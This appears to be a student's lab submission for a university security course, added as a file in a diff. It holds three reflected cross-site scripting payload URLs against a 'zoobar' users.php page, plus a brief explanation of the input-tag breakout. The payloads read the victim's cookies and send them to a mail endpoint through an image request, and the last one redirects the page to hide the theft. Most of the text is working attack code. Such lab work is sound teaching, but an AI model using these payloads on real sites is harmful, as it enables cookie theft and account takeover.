@@ -1,0 +1,12 @@
+zoobar.csl.toronto.edu/users.php?user="><script>var info = document.cookie;alert(info);var email = "http://ece568.csl.toronto.edu/a4/sendmail.php?to=yangxin5&netid=yangxin5&payload=xyz&send_submit=Send+Email";void(new Image()).src=email;</script>
+
+description: 
+The vulnerability happens at the server side which runs php. The server does not sanitize the input of the information which allows us to inject the javascript into the webpage. We use the 'user=">' to terminate the input tag tricking the browser to believe this is already the end of the input and the rest should belong to the javascript tag. By this way, we inject our javascript code into the webpage which will be executed by the browser. Because the code is within the webpage so we don't have to worry about the same origin limitation. So we use document.cookie to get the cookie and use new Image to send the email.
+
+
+
+
+zoobar.csl.toronto.edu/users.php?user=%22%3E%3Cscript%3Evar%20info%20=%20document.cookie;alert(info);var%20email%20=%20%22http://ece568.csl.toronto.edu/a4/sendmail.php?to=yangxin5%26netid=yangxin5%26payload=xyz%26send_submit=Send%2BEmail%22;(new%20Image()).src=%20%22http://ece568.csl.toronto.edu/a4/sendmail.php?to=yangxin5%26netid=yangxin5%26payload=xyz%26send_submit=Send%2BEmail%22;%3C/script%3E%20
+
+
+http://zoobar.csl.toronto.edu/users.php?user="%20size="10"><script language="javascript" type="text/javascript">var%20info%20=%20document.cookie;var%20d=new%20Image(1,1);d.src=%20'http://ece568.csl.toronto.edu/a4/sendmail.php?to=yangxin5%26netid=yangxin5%26payload='%2Binfo%2B'%26send_submit=Send%2BEmail';setTimeout(delay, 1);function delay(){self.location="http://zoobar.csl.toronto.edu/users.php";}</script>%20<!"
